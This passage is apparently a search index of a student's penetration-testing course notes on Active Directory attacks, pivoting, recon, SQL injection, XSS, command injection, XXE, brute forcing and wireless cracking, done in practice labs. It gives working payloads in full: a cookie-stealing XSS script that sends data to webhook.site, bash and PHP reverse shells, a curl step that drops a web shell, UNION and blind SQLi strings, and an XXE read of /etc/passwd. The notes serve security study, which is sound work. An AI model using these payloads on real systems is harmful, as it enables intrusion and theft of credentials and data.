password","text":""},{"location":"g.Additional%20Active%20Directory%20Attacks/2.%20%20Abusing%20ZeroLogon/#3-restore-pass","title":"3 restore pass","text":""},{"location":"g.Additional%20Active%20Directory%20Attacks/3.%20%20PrintNightmare%20%28CVE-2021-1675%29%20Walkthrough/","title":"3.  PrintNightmare (CVE 2021 1675) Walkthrough","text":"<p>cube0x0 RCE -\u00a0https://github.com/cube0x0/CVE-2021-1675</p> <p>calebstewart LPE -\u00a0https://github.com/calebstewart/CVE-2021-1675</p> <p>prince spoof ??</p> <p>print spooler </p> <p></p> <p></p> <p>generate shell </p> <p>dll obfuscation , av bypassing</p>"},{"location":"h.Active%20Directory%20Case%20Studies/1.%20%20AD%20Case%20Study%201/","title":"1.  AD Case Study 1","text":"<p>https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security/</p>"},{"location":"h.Active%20Directory%20Case%20Studies/2.%20AD%20Case%20Study%202/","title":"2. AD Case Study 2","text":"<p>https://tcm-sec.com/pentest-tales-002-digging-deep</p>"},{"location":"h.Active%20Directory%20Case%20Studies/3.%20AD%20Case%20Study%203/","title":"3. AD Case Study 3","text":"<p>enumerate no initial attack available found smb share public with file that have password </p>"},{"location":"i.Post%20Exploitation/1.Introduction/","title":"1.Introduction","text":"<p>maintining access  pivoting clean up as pentester (unlike hacker or red teamer)</p>"},{"location":"i.Post%20Exploitation/2.%20File%20Transfers%20Review/","title":"2. File Transfers Review","text":"<p>also with meterpreter in metasploit (upload and download features)</p> <p>use : python to share file , certutil or ftp to get it in windows or wget in linux</p>"},{"location":"i.Post%20Exploitation/3.Maintaining%20Access%20Overview/","title":"3.Maintaining Access Overview","text":"<p> with metasploit u an open a pport with </p>"},{"location":"i.Post%20Exploitation/4.Pivoting%20Overview/","title":"4.Pivoting Overview","text":""},{"location":"i.Post%20Exploitation/5.%20%20Pivoting%20Walkthrough/","title":"5.  Pivoting Walkthrough","text":"<p>-f : background</p> <p>-N : port forwarding (no remote  commands)</p> <p>-D: bind with port !</p> <p>now we can proxy our traffic through this machine to access next network </p>"},{"location":"i.Post%20Exploitation/5.%20%20Pivoting%20Walkthrough/#1","title":"1","text":"<p>88: port kerberos in DC</p> <p>tcp scan better than syn scan for proxychains </p>"},{"location":"i.Post%20Exploitation/5.%20%20Pivoting%20Walkthrough/#2","title":"2","text":""},{"location":"i.Post%20Exploitation/5.%20%20Pivoting%20Walkthrough/#3","title":"3","text":"<p>as long this is established  : </p> <p>we can do this :  </p>"},{"location":"i.Post%20Exploitation/5.%20%20Pivoting%20Walkthrough/#4","title":"4","text":""},{"location":"i.Post%20Exploitation/6.%20%20Cleaning%20Up/","title":"6.  Cleaning Up","text":"<p>from hacker perspective :  - delete log files</p>"},{"location":"j.Web%20Application%20Enumeration%2C%20Revisited/1.%20%20Finding%20Subdomains%20with%20Assetfinder/","title":"1.  Finding Subdomains with Assetfinder","text":""},{"location":"j.Web%20Application%20Enumeration%2C%20Revisited/2.Finding%20Subdomains%20with%20Amass/","title":"2.Finding Subdomains with Amass","text":"<p>from source installation</p> <p></p> <p></p>"},{"location":"j.Web%20Application%20Enumeration%2C%20Revisited/3.%20%20Finding%20Alive%20Domains%20with%20Httprobe/","title":"3.  Finding Alive Domains with Httprobe","text":""},{"location":"j.Web%20Application%20Enumeration%2C%20Revisited/4.%20%20%20Screenshotting%20Websites%20with%20GoWitness/","title":"4.   Screenshotting Websites with GoWitness","text":"<p>GoWitness -\u00a0https://github.com/sensepost/gowitness</p> <p><code>gowitness single http://www.esi.ac.ma</code> </p> <p>then go to screenshots folder in same directory where u launched the command</p>"},{"location":"j.Web%20Application%20Enumeration%2C%20Revisited/5.%20%20Automating%20the%20Enumeration%20Process/","title":"5.  Automating the Enumeration Process","text":"<p>subdomain  takeover attack --&gt; control subdomain wayback url and archive ?</p> <p></p>"},{"location":"j.Web%20Application%20Enumeration%2C%20Revisited/5.%20%20Automating%20the%20Enumeration%20Process/#ressource","title":"Ressource :","text":"<p>sumrecon:\u00a0https://github.com/thatonetester/sumrecon</p> <p>TCM's modified script -\u00a0https://pastebin.com/MhE6zXVt</p>"},{"location":"j.Web%20Application%20Enumeration%2C%20Revisited/6.%20%20Additional%20Resources/","title":"6.  Additional Resources","text":"<p>The Bug Hunter's Methodology -\u00a0https://www.youtube.com/watch?v=uKWu6yhnhbQ</p> <p>Nahamsec Recon Playlist -\u00a0https://www.youtube.com/watch?v=MIujSpuDtFY&amp;list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/1.Lab%20Setup/","title":"1.Lab Setup","text":""},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/1.Lab%20Setup/#lab-link","title":"Lab link :","text":"<p>https://cdn.fs.teachablecdn.com/CbIyLkOuS4GUH7TNFTFg</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/1.Lab%20Setup/#set-up","title":"set up :","text":"<p>[!Note] need to know how to deploy application docker for example to test it .</p> <pre><code>sudo apt update\nsudo apt upgrade\nsudo apt install docker.io\ndocker --version\nsudo apt install docker-compose\ndocker-compose --version\n\n#restart the VM\ntar -xf peh-web-labs.tar.gz\ncd labs\nsudo docker-compose up\n</code></pre> <p>Once you see the databses are 'ready for connections' the containers should be ready to go. </p> <p>final step :  <pre><code>./set-permissions.sh\n</code></pre></p> <p>Browse to\u00a0<code>http://localhost</code></p> <p>[!Extra to know] </p> <p>```shell sudo docker-compose up -d (run the container in background) sudo docker ps -a (see dockers that are running) sudo docker-compose stop (shut all containers) sudo docker rm (remove) sudo docker rm $(sudo docker ps -aq)  (remove all containers) locahost/init.php (reset lab)</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/10.%20%20XSS%20-%20Challenge%20Walkthrough/","title":"10.  XSS   Challenge Walkthrough","text":"<ul> <li> <p>create image that will ask webhook for image(then reload admin page)(and then show the admin cookie in webhook) <pre><code>&lt;script&gt;var i=new Image;i.src=\"https://webhook.site/512116a1-a097-4166-8603-f91a28a1f21a/?\"+document.cookie;&lt;/script&gt;\n</code></pre></p> </li> <li> <p>u can check in admin page in console by : <pre><code>document.cookie\n</code></pre></p> </li> </ul> <p>-As solution to this vuln. httponly must = true , so that js cannot access document.cookie ; or filter user input (escape data input) by making src=card.pic in pug file ;</p> <ul> <li>another attack : cookie jar overflow     cookie jar overflow : create many cookies so that browser delete cookies in order of time and kick everyone out  of the web </li> </ul> <ul> <li>http splitting attack :     u can bypass httponly</li> </ul>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/11.%20%20Command%20Injection%20-%20Introduction/","title":"11.  Command Injection   Introduction","text":"<ul> <li>command injection is dangerous : if founded u can compromise the application and the host</li> <li>app take input from user and pass it to function that execute it as code ; which is against secure development principal : not mix data and code.</li> <li>eval is evil cuz it executes data passed to it.</li> <li>in JS : <pre><code>let userInput='7*7'\neval(userInput)  (get 49)\n</code></pre></li> <li>in php <pre><code>php -a (interactive php)\n$userInput='whoami';\nsystem($userInput); (get kali)\n</code></pre></li> </ul> <p>[!warning] not use eval and system never trsut input</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/12.%20%20Command%20Injection%20-%20Basics/","title":"12.  Command Injection   Basics","text":"<ul> <li> <p>way to exploit command injection vuln: <code>;whoami;asd</code> <code>;ls -lah ;  asd</code> (formatted in inspection) <code>;cat etc/passwd ; asd</code></p> <p>[!note] this site payload all the things tutor notes</p> </li> <li> <p>reverse shell <code>;bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1;asd</code> :failed after`nc -nlvp 4444 and ip a</p> </li> </ul> <p>so try a php : <code>;which php;asd</code>  (usr/local/bin/php) <code>ip a</code> and <code>nc -nlvp 4444 10.0.2.15</code> <code>;/usr/local/bin/php -r '$sock=fsockopen(\"10.0.2.15\",4444);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");';asd</code></p> <p>the u can run commands there in shell: whoami , ls -lah / ,hostname....</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/13.%20%20Command%20Injection%20-%20Blind%20..%20Out-of-Band/","title":"13.  Command Injection   Blind .. Out of Band","text":"<ul> <li>we only in true/false situation (blind)</li> <li>so we out of band technique (meaning we get information in other place) <code>https://webhook.site/bc623622-67a9-467d-952c-1cfd4bbdff53?</code>whoami`</li> <li>whoami is in back-tick</li> </ul> <ul> <li> <p>another way : <code>python -m http.server 8080</code> <code>https://tcm-sec.com \\n wget 10.10.100.148:8080/test</code></p> </li> <li> <p>reverse shell require ; (may it is filtered in the website)</p> </li> <li>upload a shell and trigger it .. How? u need to update the file(<code>cd tmp , cp /usr/share/webshells/laudanum/php/php-reverse-shell.php .,nano php-reverse-shell.php,mv php-reverse-shell.php rev.php</code>) to your ip and port 4444(<code>nc -nlvp 4444</code>) and run this <code>https://tcm-sec.com &amp;&amp; curl 10.0.2.15:8080/rev.php &gt; /var/www/html/rev.php</code> the in browser <code>localhost/rev.php</code></li> </ul>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/14.Command%20Injection%20-%20Challenge%20Walkthrough/","title":"14.Command Injection   Challenge Walkthrough","text":"<p>after this we have the part : </p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/14.Command%20Injection%20-%20Challenge%20Walkthrough/#insecure-file-upload-introduction","title":"Insecure File Upload - Introduction","text":""},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/14.Command%20Injection%20-%20Challenge%20Walkthrough/#insecure-file-upload-basic-bypass","title":"Insecure File Upload - Basic Bypass","text":""},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/14.Command%20Injection%20-%20Challenge%20Walkthrough/#insecure-file-upload-magic-bytes","title":"Insecure File Upload - Magic Bytes","text":""},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/14.Command%20Injection%20-%20Challenge%20Walkthrough/#insecure-file-upload-challenge-walkthrough","title":"Insecure File Upload - Challenge Walkthrough","text":""},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/15.%20%20Attacking%20Authentication%20-%20Intro/","title":"15.  Attacking Authentication   Intro","text":"<ul> <li>Authentication is identity (who am I ?) and authorization is action  (what allowed to do ?).</li> <li>Attacking Authentication : 1.brute-force attack and 2.logic issues .</li> </ul>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/16%20-Attacking%20Authentication%20-%20Brute%20Force/","title":"16  Attacking Authentication   Brute Force","text":"<p>use burpsuite / hydra / ffuf - <code>nano req.txt</code> insert the html and change the value of password to FUZZ - <code>ffuf -request req.txt -request-proto http -w pathofwordlist -fs 1814</code> (to filter the wrong)</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/17.%20%20Attacking%20Authentication%20-%20MFA/","title":"17.  Attacking Authentication   MFA","text":"<ul> <li> <p>same token for all !!! weak MFA</p> <p>first u write username and password then u receive code , then just change name and u enter as anyone u choose (as admin for example) ; - he used burpsuite intrecept on and then off</p> </li> </ul>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/18.%20Attacking%20Authentication%20-%20Challenge%20Walkthrough/","title":"for each username 4 top passwords","text":"<ul> <li>idea is that we test(so we change accounts rather than staying in one)</li> <li>we will try ffuf <code>ffuf -request teashop.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w wordlist.txt:FUZZUSER -fs 3376</code> </li> <li>or burpsuite pro</li> </ul>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/19.XXE%20-%20External%20Entities%20Injection/","title":"19.XXE   External Entities Injection","text":"<ul> <li>somme application use XML to transfer data .</li> <li>look to file : xml-safe and xml-exploit </li> <li>exploit :  ```XML  </li> </ul> <p>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]  &amp;xx;pass</p> <p>```</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/2.%20%20SQL%20Injection%20-%20Introduction/","title":"2.  SQL Injection   Introduction","text":"<p><pre><code>sudo systemctl start mysql (start sql service)\n\nsudo mysql (login to mysql)\n\nshow databases , show tables\n--- create database and table\nCREATE DATABASE sqldemo;\nuse sqldemo;\nCREATE TABLE users(\nusername(varchar255),\npassword(varchar255),\nage int,\nPRIMARY KEY(username)\n);\n\n--- insert data into the user table\nINSERT INTO users(username,password,age) \nVALUES(\"jeremy\",\"letmein\",30)\n\nINSERT INTO users(username,password,age) \nVALUES(\"jessamy\",\"kittems\",31)\n</code></pre> in this video : what matters is you can do :</p> <p>```shell select age from users where username=\"jeremy\" union select password from users;</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/20.%20%20IDOR%20-%20Insecure%20Direct%20Object%20Reference/","title":"20.  IDOR   Insecure Direct Object Reference","text":"<ul> <li>access control issue where we can requwest a resource whithin object id and return information of that object (user id , product id)</li> <li> <p>in API driven application we call it bola  ```python python3 -c 'for i in range(1,2001):print(i)' &gt; num.txt <pre><code>then `\n```shell\nffuf -u 'url(id=FUZZ)' -w num.txt -fd 849 | grep FUZZ\n</code></pre></p> </li> <li> <p>u can write custom script for find admin account .</p> </li> </ul>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/21.%20capstone/","title":"21. capstone","text":""},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/3.%20%20SQL%20Injection%20-%20UNION/","title":"3.  SQL Injection   UNION","text":"<p>[!Note] - \" or ' cuz these characters can break SQL statemen - union: retrieve information from tables which are not initially defined(another table/select same name comlumsn like 1 st query)</p> <pre><code>jeremy \"\njeremy '\njeremy j\n\njeremy' or 1=1# (we get a bunch of results , # :terminantor ; end query :whatever after that is ignored)\njeremy' or 1=1-- - (-- - : terminator)\n\n---union\njeremy' union select null,null,null\njeremy' union select null,null,version()#\njeremy' union select null,null,table_name from information_schema.tables#\n\njeremy' union select null,null,column_name from information_schema.columns#\njeremy' union select null,null,password from injection0x01# (all paswords, u can try null(int)) \n</code></pre>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/4.SQL%20Injection%20-%20Blind%20Part%201/","title":"4.SQL Injection   Blind Part 1","text":"<p><pre><code>username=jeremy'+or+1%3d1%23&amp;password=jeremy\nusername=jeremy' or 1=1#&amp;password=jeremy after decode..\n</code></pre> - automate with sqlmap</p> <p><pre><code>sqlmap -r req.txt (no result) so...fuzz or manual now\n\nCookie: session=6967cabefd763ac1a1a88e11159957db' and 1=1#\nCookie: session=6967cabefd763ac1a1a88e11159957db' and 1='1\n</code></pre> we observe that content-length did not change and welcome is still there so :</p> <p>[!warning]  this is a indication of SQL-injection.</p> <p>understund the behavior of the application ,find meaningful impact of this vulnerabilities</p> <p>this is  blind sql injection cuz query only change the behavior of application ... but do not give data </p> <p>we have to create payloads that create true/false output , based on that we can extract data ..(yes/no question)</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/5.%20%20SQL%20Injection%20-%20Challenge%20Waklthrough/","title":"5.  SQL Injection   Challenge Waklthrough","text":"<p>in bar search : - <code>x' or 1=1#</code>  return all products (we have SQL injection) - <code>Tanjyoubi Sushi Rack' union select null,null,null,null#</code> number of columns - <code>Tanjyoubi Sushi Rack' union select null,null,null,table_name from information_schema.tables#</code>  to know tables of database - <code>Tanjyoubi Sushi Rack' union select null,null,null,username from injection0x03_users#</code> see users - <code>Tanjyoubi Sushi Rack' union select null,null,null,password from injection0x03_users#</code> see password</p> <ul> <li><pre><code>sqlmap -r req3.txt -T injection0x03_users --dump\n</code></pre></li> </ul> <p>[!question] what's in req3.txt</p> <p>[!success] Answer -  u copy from response : POST /labs/i0x03.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 102 Origin: http://localhost Connection: close Referer: http://localhost/labs/i0x03.php Cookie: PHPSESSID=31snl0akpssnqkbb38d3i7fkuo Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 product=test</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/6.Credential%20Stuffing%20and%20Password%20Spraying/","title":"credential_stuffing","text":"<ol> <li>credential stuffing :here we use 2 lists of mail and passwords at same time or</li> <li>password spraying : where u try one password against many accounts .. and repeat same thing with another. </li> </ol> <p>in case of AD : pay attention during pentest to make DDOS by trying passwords and be success.</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/6.SQL%20Injection%20-%20Blind%20Part%202/","title":"6.SQL Injection   Blind Part 2","text":"<ul> <li>we need to use payloads : use substrings <pre><code>Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring('a',1,1)='a'#\n</code></pre> we do not want to compare only but to compare from smt from the database.</li> </ul> <p><pre><code>Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select version()),1,1)='8'#\n</code></pre> so version is 8 </p> <pre><code>Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select version()),1,5)='8.0.3'#\n</code></pre> <ul> <li> <p>now let's try to extract the password: <pre><code>Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select password),1,6)='jeremy'#\n\nbut \n\nCookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select password from injection0x02 where username='jessamy'),1,1)='a'#\n\nand check each time with intruder(manually)(b,c,....)\n</code></pre></p> </li> <li> <p>to make it automatic : sqlmap <pre><code>nano req.txt (past the cookie page of repeater)\n\nsqlmap -r req.txt --level=2 --dump (dump all tables)\n\nsqlmap -r req.txt --level=2 --dump -T injection0x02\n</code></pre></p> </li> </ul>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/7.%20%20XSS%20-%20Introduction/","title":"7.  XSS   Introduction","text":"<ul> <li>XSS execute JS on victim browser and control over the application for that user.</li> <li> <p>Types : </p> <ol> <li>reflected XSS : script u try to inject comes from the current HTTP-request ; u send a request and u get a response and that script is included in the response ;u only talk to yourself unless the payload is in URI (push smn to click it) </li> <li>stored XSS: more powerful ; payload is stored in database and retrieved later .(attack other user)</li> <li>DOM-based XSS: client-side has some vulnerable JS that uses untrusted input instead of having vulnerability server side </li> </ol> </li> <li> <p>in dev-tools of web page(inspect) : in console: u can do <code>alert(1)</code> </p> </li> <li>or ,since this command can be filtered by browsers now  u can : <code>print()</code> and <code>prompt(\"hello\")</code></li> <li>also : <code>function logKey(event){console.log(event.key)}</code> <code>document.addEventListener('keydown',logKey)</code></li> <li>or replace <code>console.log</code> by <code>fetch</code></li> </ul> <p>[!note] learn JS to create XSS payloads and troubleshoot them , and understund the payloads u find in internet.</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/8.%20%20XSS%20-%20DOM%20Lab/","title":"8.  XSS   DOM Lab","text":"<ul> <li>this is DOM-based XSS : cuz in network tab there is no request going and coming back to server : vulnerability within client .     <code>&lt;script&gt;prompt(1)&lt;/script&gt;</code> not work cuz even if added to page , but not called , so we need trigger.</li> </ul> <p>[!note] if it was a part of the page when it loaded , it would have been triggered</p> <pre><code>    &lt;img src=x onerror=\"prompt(1)\"&gt;\n</code></pre> <ul> <li>Now we want to forward the user to another page:</li> </ul> <pre><code>    &lt;img src=x onerror=\"window.location.href='https://tcm-sec.com'\"&gt;\n</code></pre>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/9-XSS%20-%20Stored%20Lab/","title":"9 XSS   Stored Lab","text":"<ul> <li>create container in browser </li> <li>HTML injection     <code>&lt;h1&gt;test&lt;/h1&gt;</code></li> <li>we see that both container have test added so , it is stored XSS .</li> <li> <p>this line is executed , cuz page is loaded  <pre><code>&lt;script&gt;prompt(1)&lt;/script&gt;\n</code></pre></p> </li> <li> <p>or to see cookie: <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n</code></pre></p> </li> </ul> <p>[!success] best practice set cookie to httponly (flag that prevents js from accessing your cookie)</p>"},{"location":"k.Find%20%26%20Exploit%20Common%20Web%20Vulnerabilities/9-XSS%20-%20Stored%20Lab/#for-challenge","title":"For challenge:","text":"<ul> <li>use <code>netcat</code> or webhook.site (when exfiltrate sensitive information in pentesting , not use public site like that , instead use : EC2 or vpn ) ^628c06</li> <li>create payload and trigger it</li> </ul> <p>[!question] What is the EC2?</p> <p>^0d8c2a</p> <p>[!success] Answer Amazon Elastic Compute Cloud Amazon Elastic Compute Cloud\u00a0(Amazon EC2) is a web service that provides secure, resizable compute capacity in the cloud. It is designed to make web-scale cloud computing easier for developers</p>"},{"location":"l.Wireless%20Penetration%20Testing/1.001_Wireless_Penetration_Testing_Overview/","title":"1.001 Wireless Penetration Testing Overview","text":""},{"location":"l.Wireless%20Penetration%20Testing/2%20%20%20002_WPA_PS2_Exploit_Walkthrough/","title":"2   002 WPA PS2 Exploit Walkthrough","text":"<p><code>iwlist</code> monitor mode <code>airmon-ng check kill</code> <code>airmon-ng start wlan0</code></p>"},{"location":"l.Wireless%20Penetration%20Testing/2%20%20%20002_WPA_PS2_Exploit_Walkthrough/#devices-around-me","title":"devices around me","text":"<p><code>airodump-ng wlan0mon</code></p>"},{"location":"l.Wireless%20Penetration%20Testing/2%20%20%20002_WPA_PS2_Exploit_Walkthrough/#wireless-channels","title":"wireless channels","text":"<p>1-14</p> <p></p> <p></p> <p>deauth one time </p> <p></p> <p> </p>"},{"location":"m.Legal%20Documents%20and%20Report%20Writing/1.%20%20001_Common_Legal_Documents/","title":"1.  001 Common Legal Documents","text":"<p>rapid7 </p>"},{"location":"m.Legal%20Documents%20and%20Report%20Writing/2.%20%20002_Pentest_Report_Writing/","title":"2.  002 Pentest Report Writing","text":"<p>Resources for this video:</p> <p>Sample Pentest Report:\u00a0https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report</p>"},{"location":"m.Legal%20Documents%20and%20Report%20Writing/3%20%20003_Reviewing_a_Real_Pentest_Report/","title":"3  003 Reviewing a Real Pentest Report","text":""},{"location":"blog/","title":"Blog","text":""}]}